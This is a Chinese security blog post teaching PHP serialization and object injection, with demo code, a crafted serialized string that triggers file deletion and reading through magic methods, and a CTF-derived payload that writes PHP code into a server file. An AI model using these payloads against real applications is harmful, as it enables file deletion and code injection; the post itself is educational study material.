<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>PHP序列化学习总结 - 小黑屋</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="&amp;lt;!-- 这里是文章头部的图片 大小为800px*200px左右--&amp;gt;
&amp;lt;!-- 这里是简单的介绍，50-100字 --&amp;gt;
前段时间学习了php对象序列化，总结了一些遇到的和看到的利用方法，在这之前我对序列化完全John Snow，所以这篇笔记写得很细很基础。">
<meta property="og:type" content="article">
<meta property="og:title" content="PHP序列化学习总结">
<meta property="og:url" content="http://das.scusec.org/2016/08/25/php-serialize/index.html">
<meta property="og:site_name" content="小黑屋">
<meta property="og:description" content="&amp;lt;!-- 这里是文章头部的图片 大小为800px*200px左右--&amp;gt;
&amp;lt;!-- 这里是简单的介绍，50-100字 --&amp;gt;
前段时间学习了php对象序列化，总结了一些遇到的和看到的利用方法，在这之前我对序列化完全John Snow，所以这篇笔记写得很细很基础。">
<meta property="og:image" content="http://dassec.b0.upaiyun.com/kovige/obj.png">
<meta property="og:image" content="http://dassec.b0.upaiyun.com/kovige/1468567761183.jpg">
<meta property="og:image" content="http://dassec.b0.upaiyun.com/kovige/1468571622855.jpg">
<meta property="og:image" content="http://dassec.b0.upaiyun.com/kovige/1468571947277.jpg">
<meta property="og:image" content="http://dassec.b0.upaiyun.com/kovige/1468572495614.jpg">
<meta property="og:image" content="http://dassec.b0.upaiyun.com/kovige/1468572538300.jpg">
<meta property="og:updated_time" content="2016-08-26T02:09:58.759Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="PHP序列化学习总结">
<meta name="twitter:description" content="&amp;lt;!-- 这里是文章头部的图片 大小为800px*200px左右--&amp;gt;
&amp;lt;!-- 这里是简单的介绍，50-100字 --&amp;gt;
前段时间学习了php对象序列化，总结了一些遇到的和看到的利用方法，在这之前我对序列化完全John Snow，所以这篇笔记写得很细很基础。">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link href="/webfonts/ptserif/main.css" rel='stylesheet' type='text/css'>
  <link href="/webfonts/source-code-pro/main.css" rel="stylesheet" type="text/css">
  <link rel="stylesheet" href="/css/style.css" type="text/css">
  

</head>

<body>
  <div id="container">
    <header id="header">
  <div id="header-outer" class="outer">
    <div id="header-inner" class="inner">
      <a id="main-nav-toggle" class="nav-icon" href="javascript:;"></a>
      <a id="logo" class="logo logo-text" href="/">小黑屋</a>
      <nav id="main-nav">
        
          <a class="main-nav-link" href="/">首页</a>
        
          <a class="main-nav-link" href="/archives">文档</a>
        
          <a class="main-nav-link" href="/categories">分类</a>
        
          <a class="main-nav-link" href="/tags">标签</a>
        
          <a class="main-nav-link" href="/links">链接</a>
        
          <a class="main-nav-link" href="/about">关于</a>
        
      </nav>
      <nav id="sub-nav">
        <div id="search-form-wrap">
          <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://das.scusec.org"></form>
        </div>
      </nav>
    </div>
  </div>
</header>
    <section id="main" class="outer"><article id="post-php-serialize" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      PHP序列化学习总结
    </h1>
  

      </header>
    
    <div class="article-meta">
      <a href="/2016/08/25/php-serialize/" class="article-date">
  <time datetime="2016-08-25T03:06:54.000Z" itemprop="datePublished">2016-08-25</time>
</a>
      
  <div class="article-category">
    <a class="article-category-link" href="/categories/安全笔记/">安全笔记</a>
  </div>

      
    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <!-- 这里是文章头部的图片 大小为800px*200px左右-->
<p><img src="http://dassec.b0.upaiyun.com/kovige/obj.png" alt=""><br><!-- 这里是简单的介绍，50-100字 --></p>
<p>前段时间学习了php对象序列化，总结了一些遇到的和看到的利用方法，在这之前我对序列化完全John Snow，所以这篇笔记写得很细很基础。</p>
<a id="more"></a>
<h2 id="0x00-序列化函数"><a href="#0x00-序列化函数" class="headerlink" title="0x00 序列化函数"></a>0x00 序列化函数</h2><p><strong>serialize()</strong>：返回带有变量类型和值的字符串<br><strong>unserialize()</strong>：想要将已序列化的字符串变回 PHP 的值</p>
<p>测试代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    	<span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    	<span class="keyword">var</span> <span class="variable">$b</span>;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>)</span></span>&#123;</span><br><span class="line">    		<span class="variable">$a</span>  = <span class="variable">$a</span>;</span><br><span class="line">    		<span class="variable">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    </span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test1</span> <span class="keyword">extends</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">     	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$a</span>)</span></span>&#123;</span><br><span class="line">     		<span class="variable">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">     	&#125;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="variable">$a</span> = <span class="string">'hello'</span>;</span><br><span class="line">    <span class="variable">$b</span> = <span class="number">123</span>;</span><br><span class="line">    <span class="variable">$c</span> = <span class="keyword">false</span>;</span><br><span class="line">    <span class="variable">$d</span> = <span class="keyword">new</span> test(<span class="string">'helloa'</span>,<span class="string">'hellob'</span>,<span class="string">'helloc'</span>);</span><br><span class="line">    <span class="variable">$e</span> = <span class="keyword">new</span> test1(<span class="string">'hello'</span>);</span><br><span class="line">    </span><br><span class="line">    var_dump(serialize(<span class="variable">$a</span>));</span><br><span class="line">    var_dump(serialize(<span class="variable">$b</span>));</span><br><span class="line">    var_dump(serialize(<span class="variable">$c</span>));</span><br><span class="line">    var_dump(serialize(<span class="variable">$d</span>));</span><br><span class="line">    var_dump(serialize(<span class="variable">$e</span>));</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>运行结果：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">string <span class="string">'s:5:"hello";'</span> (length=<span class="number">12</span>)</span><br><span class="line">string <span class="string">'i:123;'</span> (length=<span class="number">6</span>)</span><br><span class="line">string <span class="string">'b:0;'</span> (length=<span class="number">4</span>)</span><br><span class="line">string <span class="string">'O:4:"test":2:&#123;s:1:"a";N;s:1:"b";s:6:"hellob";&#125;'</span> (length=<span class="number">46</span>)</span><br><span class="line">string <span class="string">'O:5:"test1":2:&#123;s:1:"a";s:5:"hello";s:1:"b";N;&#125;'</span> (length=<span class="number">46</span>)</span><br></pre></td></tr></table></figure>
<p>序列化字符串格式：<strong>变量类型：变量长度：变量内容</strong>。<br>如果序列化的是一个对象，序列化字符串格式为：<br><strong>变量类型：类名长度：类名：属性数量：｛属性类型：属性名长度：属性名；属性值类型：属性值长度：属性值内容｝</strong></p>
<p>将上述结果反序列化输出，执行结果：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">string <span class="string">'hello'</span> (length=<span class="number">5</span>)</span><br><span class="line">int <span class="number">123</span></span><br><span class="line">boolean <span class="keyword">false</span></span><br><span class="line">object(test)[<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">public</span> <span class="string">'a'</span> =&gt; <span class="keyword">null</span></span><br><span class="line">  <span class="keyword">public</span> <span class="string">'b'</span> =&gt; string <span class="string">'hellob'</span> (length=<span class="number">6</span>)</span><br><span class="line">object(test1)[<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">public</span> <span class="string">'a'</span> =&gt; string <span class="string">'hello'</span> (length=<span class="number">5</span>)</span><br><span class="line">  <span class="keyword">public</span> <span class="string">'b'</span> =&gt; <span class="keyword">null</span></span><br></pre></td></tr></table></figure></p>
<h2 id="0x01-对象序列化"><a href="#0x01-对象序列化" class="headerlink" title="0x01 对象序列化"></a>0x01 对象序列化</h2><p>当序列化对象时，PHP 将在序列动作之前调用该对象的成员函数 <strong>sleep()。这样就允许对象在被序列化之前做任何清除操作。类似的，当使用 unserialize() 恢复对象时， 将调用</strong>wakeup()成员函数。</p>
<p>在serialize()函数执行时，会先检查类中是否定义了<strong>sleep()函数，如果存在，则首先调用</strong>sleep()函数，如果不存在，就保留序列字符串中的所有属性。</p>
<p>在unserialize()函数执行时，会先检查是否定义了<strong>wakeup()函数。如果</strong>wakeup()存在，将执行__wakeup()函数，会使变量被重新赋值。</p>
<p>serialize()测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    	<span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    	<span class="keyword">var</span> <span class="variable">$b</span>;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>)</span></span>&#123;</span><br><span class="line">    		<span class="variable">$this</span>-&gt;a  = <span class="variable">$a</span>;</span><br><span class="line">    		<span class="variable">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    </span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">"b has changed"</span>.<span class="string">"\n"</span>;</span><br><span class="line">    		<span class="variable">$this</span>-&gt;b = <span class="string">'hib'</span>;</span><br><span class="line">    		<span class="keyword">return</span> <span class="variable">$this</span>-&gt;b;</span><br><span class="line">    		</span><br><span class="line">    </span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">"a has changed"</span>.<span class="string">"\n"</span>;</span><br><span class="line">    		<span class="variable">$this</span>-&gt;a = <span class="string">'hia'</span>;</span><br><span class="line">    </span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test1</span> <span class="keyword">extends</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">     	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$a</span>)</span></span>&#123;</span><br><span class="line">     		<span class="variable">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">     	&#125;</span><br><span class="line">     &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$d</span> = <span class="keyword">new</span> test(<span class="string">'helloa'</span>,<span class="string">'hellob'</span>,<span class="string">'helloc'</span>);</span><br><span class="line">    <span class="variable">$e</span> = <span class="keyword">new</span> test1(<span class="string">'hello'</span>);</span><br><span class="line">    </span><br><span class="line">    serialize(<span class="variable">$d</span>);</span><br><span class="line">    serialize(<span class="variable">$e</span>);</span><br><span class="line">    </span><br><span class="line">    var_dump(<span class="variable">$d</span>);</span><br><span class="line">    var_dump(<span class="variable">$e</span>);</span><br><span class="line"><span class="preprocessor">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>执行结果：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b has changed b has changed</span><br><span class="line">object(test)[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="string">'a'</span> =&gt; string <span class="string">'helloa'</span> (length=<span class="number">6</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="string">'b'</span> =&gt; string <span class="string">'hib'</span> (length=<span class="number">3</span>)</span><br><span class="line">object(test1)[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="string">'a'</span> =&gt; string <span class="string">'hello'</span> (length=<span class="number">5</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="string">'b'</span> =&gt; string <span class="string">'hib'</span> (length=<span class="number">3</span>)</span><br></pre></td></tr></table></figure></p>
<p>unserialize()测试代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    	<span class="keyword">var</span> <span class="variable">$a</span>;</span><br><span class="line">    	<span class="keyword">var</span> <span class="variable">$b</span>;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>)</span></span>&#123;</span><br><span class="line">    		<span class="variable">$this</span>-&gt;a  = <span class="variable">$a</span>;</span><br><span class="line">    		<span class="variable">$this</span>-&gt;b = <span class="variable">$b</span>;</span><br><span class="line">    </span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__sleep</span><span class="params">()</span></span>&#123;</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">"b has changed"</span>.<span class="string">"\n"</span>;</span><br><span class="line">    		<span class="variable">$this</span>-&gt;b = <span class="string">'hib'</span>;</span><br><span class="line">    		<span class="keyword">return</span> <span class="variable">$this</span>-&gt;b;</span><br><span class="line">    		</span><br><span class="line">    </span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    		<span class="keyword">echo</span> <span class="string">"a has changed"</span>.<span class="string">"\n"</span>;</span><br><span class="line">    		<span class="variable">$this</span>-&gt;a = <span class="string">'hia'</span>;</span><br><span class="line">    </span><br><span class="line">    	&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test1</span> <span class="keyword">extends</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">     	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$a</span>)</span></span>&#123;</span><br><span class="line">     		<span class="variable">$this</span>-&gt;a = <span class="variable">$a</span>;</span><br><span class="line">     	&#125;</span><br><span class="line">     &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="variable">$d</span> = <span class="string">'O:4:"test":2:&#123;s:1:"a";N;s:1:"b";s:6:"hellob";&#125;'</span> ;</span><br><span class="line">        <span class="variable">$e</span> = <span class="string">'O:5:"test1":2:&#123;s:1:"a";s:5:"hello";s:1:"b";N;&#125;'</span> ;</span><br><span class="line">    </span><br><span class="line">        var_dump(unserialize(<span class="variable">$d</span>));</span><br><span class="line">        var_dump(unserialize(<span class="variable">$e</span>));</span><br></pre></td></tr></table></figure>
<p>运行结果：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a has changed</span><br><span class="line">object(test)[<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">public</span> <span class="string">'a'</span> =&gt; string <span class="string">'hia'</span> (length=<span class="number">3</span>)</span><br><span class="line">  <span class="keyword">public</span> <span class="string">'b'</span> =&gt; string <span class="string">'hellob'</span> (length=<span class="number">6</span>)</span><br><span class="line">a has changed</span><br><span class="line">object(test1)[<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">public</span> <span class="string">'a'</span> =&gt; string <span class="string">'hia'</span> (length=<span class="number">3</span>)</span><br><span class="line">  <span class="keyword">public</span> <span class="string">'b'</span> =&gt; <span class="keyword">null</span></span><br></pre></td></tr></table></figure></p>
<h2 id="0x02-PHP序列化的利用"><a href="#0x02-PHP序列化的利用" class="headerlink" title="0x02 PHP序列化的利用"></a>0x02 PHP序列化的利用</h2><h3 id="1、magic函数和序列化"><a href="#1、magic函数和序列化" class="headerlink" title="1、magic函数和序列化"></a>1、magic函数和序列化</h3><p><strong>参考</strong>：<a href="http://wps2015.org/drops/drops/%E7%90%86%E8%A7%A3php%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5.html" target="_blank" rel="external">php对象注入</a><br>除了<strong>sleep()和</strong>wakeup()函数，在序列化时会执行外，还有下面几种利用方式。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">File</span></span><br><span class="line"> </span>&#123;</span><br><span class="line"> 	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$var</span>,<span class="variable">$file1</span>,<span class="variable">$file2</span>)</span></span>&#123;</span><br><span class="line"> 		<span class="variable">$this</span>-&gt;var = <span class="variable">$var</span>;</span><br><span class="line"> 		<span class="variable">$this</span>-&gt;file1 = <span class="variable">$file1</span>;</span><br><span class="line"> 		<span class="variable">$this</span>-&gt;file2 = <span class="variable">$file2</span>;</span><br><span class="line"> 		<span class="keyword">echo</span> <span class="variable">$this</span>-&gt;var.<span class="string">' and '</span>.<span class="variable">$this</span>-&gt;file1.<span class="string">' and '</span>.<span class="variable">$this</span>-&gt;file2.<span class="string">'defined'</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"> 		unlink(dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/'</span> . <span class="variable">$this</span>-&gt;file1);</span><br><span class="line"> 		<span class="keyword">echo</span> <span class="variable">$this</span>-&gt;file1.<span class="string">'deleted'</span>;</span><br><span class="line"> 	&#125;</span><br><span class="line"> 	<span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"> 		<span class="keyword">return</span> file_get_contents(<span class="variable">$this</span>-&gt;file2);</span><br><span class="line"></span><br><span class="line"> 	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $file = new File('hello','123.txt','456.php');</span></span><br><span class="line"><span class="comment">// var_dump(serialize($file));</span></span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="string">'O:4:"File":3:&#123;s:3:"var";s:5:"hello";s:5:"file1";s:7:"123.txt";s:5:"file2";s:7:"456.php";&#125;'</span>);</span><br></pre></td></tr></table></figure></p>
<p>（<strong>construct()函数，在实例化一个对象时被调用，一般用来给属性赋值，</strong>destruct()在实例化对象完成后执行，__toString()函数在echo一个对象时被调用）</p>
<p><strong>construct()函数内定义了三个变量，var这个没什么暖用，file1和file2，我们在序列化字符串中定义为已经服务器上已经存在的两个文件123.txt和456.php，</strong>destruct()中有一个unlink方法，是删除file1，__toString()中，读取file2的内容。</p>
<p>执行结果：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123.</span>txtdeleted</span><br></pre></td></tr></table></figure></p>
<p>查看源码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">&lt;?php</span>  <span class="keyword">echo</span> <span class="number">123</span>; <span class="preprocessor">?&gt;</span><span class="number">123.</span>txtdeleted</span><br></pre></td></tr></table></figure></p>
<p>将字符串反序列化后，由于已经对变量赋过值，那么就不会再执行<strong>construct()函数，在</strong>construct()中赋值的变量也是无效的。上述代码中<strong>destruct()方法在在反序列化后，实例化对象结束后执行了，</strong>tostring()函数在echo unserialize()处，也被执行了<br>如果说在当前页面中有request系列函数，那么就可以造成php对象注入：<br><a href="http://drops.wooyun.org/papers/4820" target="_blank" rel="external">http://drops.wooyun.org/papers/4820</a></p>
<h3 id="2、三个白帽挑战赛第三期"><a href="#2、三个白帽挑战赛第三期" class="headerlink" title="2、三个白帽挑战赛第三期"></a>2、三个白帽挑战赛第三期</h3><p>是一道源码审计题，题目大致是sql注入结合序列化写入文件<br>部分源码也是在某个大神<a href="http://www.math1as.com/" target="_blank" rel="external">博客</a>看到的（由于我没有做过题，所以我只截取了和序列化漏洞相关的部分源码）：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cache</span> <span class="keyword">extends</span> \<span class="title">ArrayObject</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">(<span class="variable">$path</span>)</span></span><br><span class="line">	</span>&#123;</span><br><span class="line">		<span class="keyword">parent</span>::__construct([],\ArrayObject::STD_PROP_LIST | \ArrayObject::ARRAY_AS_PROPS);</span><br><span class="line">		<span class="variable">$this</span>-&gt;path = <span class="variable">$path</span>;</span><br><span class="line">		<span class="keyword">if</span>(file_exists(<span class="variable">$path</span>))&#123;</span><br><span class="line">			<span class="variable">$this</span>-&gt;cache = unserialize(file_get_contents(<span class="variable">$this</span>-&gt;path));</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">offset</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">//一些不知道干嘛用的代码</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span><br><span class="line">	</span>&#123;</span><br><span class="line">		<span class="variable">$cache</span> = <span class="variable">$this</span>-&gt;serialize();</span><br><span class="line">		file_put_contents(<span class="variable">$this</span>-&gt;path, <span class="variable">$cache</span>);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>又由于我没有做过题。。。。所以模拟了这样一个页面去实例化:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">'cache.php'</span>);</span><br><span class="line"><span class="variable">$cache</span> = <span class="keyword">new</span> Cache(<span class="string">'path.txt'</span>);</span><br></pre></td></tr></table></figure></p>
<p>这题好像是这样的：<br>通过SQL注入，可控一个文件，假设可控的是path.txt这个文件（在实际的题目中，SQL注入权限不够，web目录下不可写文件，但其他目录可写，已知目录下有文件md5(username).txt，文件名知道，内容可控），这段代码的意思是，判断该文件存在后，读取文件内容，并且反序列化内容，结束时再经过序列化存进文件中。所以可以在可控文件中构造序列化字符串，改变当前的path属性为我们想要的目录。</p>
<p>path.txt:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="number">5</span>:<span class="string">"Cache"</span>:<span class="number">103</span>:&#123;x:i:<span class="number">3</span>;a:<span class="number">0</span>:&#123;&#125;;m:a:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">"path"</span>;s:<span class="number">25</span>:<span class="string">"F:\wamp\www\test\path.php"</span>;s:<span class="number">5</span>:<span class="string">"cache"</span>;s:<span class="number">18</span>:<span class="string">"&lt;?php echo 123; ?&gt;"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>上述字符串是通过输出serialize(一个实例化的Cache对象)构造的,当__construct()执行时，就会将上述字符串反序列化，此时已经实例化了一个cache对象，而它的path值变成了我们定义的”F:\wamp\www\test\path.php”，并且多了一个cache属性，值为<code>&lt;?php echo 123; ?&gt;</code>，这里的属性名cache是可以随意取的，但如果源码中：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cache</span> = <span class="variable">$this</span>-&gt;serialize();</span><br></pre></td></tr></table></figure></p>
<p>变成了：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cache</span> = serialize(<span class="variable">$this</span>-&gt;cache);</span><br></pre></td></tr></table></figure></p>
<p>那么path.txt中的<code>&quot;cache&quot;;s:18:&quot;&lt;?php echo 123; ?&gt;&quot;</code>;属性名就必须和源码serialize($this-&gt;cache)当中的属性名相同。</p>
<p>所以，现在服务器上其实有两个对象，一个是<code>$cache = new Cache(&#39;path.txt&#39;);</code>定义的$cache，它的path属性值为path.txt;另一个对象是<br><code>C:5:&quot;Cache&quot;:103:{x:i:3;a:0:{};m:a:2:{s:4:&quot;path&quot;;s:25:&quot;F:\wamp\www\test\path.php&quot;;s:5:&quot;cache&quot;;s:18:&quot;&lt;?php echo 123; ?&gt;&quot;;}}</code>被反序列化后的对象，它的path属性的值为path.php。<br>两个对象实例化结束后，会调用其__destruct()方法，将对象自身序列化，写入path属性定义的路径中。这样就将包含<code>&lt;?php echo 123; ?&gt;</code>的内容写进了path.php中。</p>
<h3 id="3、安恒ctf-web3"><a href="#3、安恒ctf-web3" class="headerlink" title="3、安恒ctf web3"></a>3、安恒ctf web3</h3><p>一道源码审计题，解题思路是session上传进度，和session序列化处理器漏洞相结合。</p>
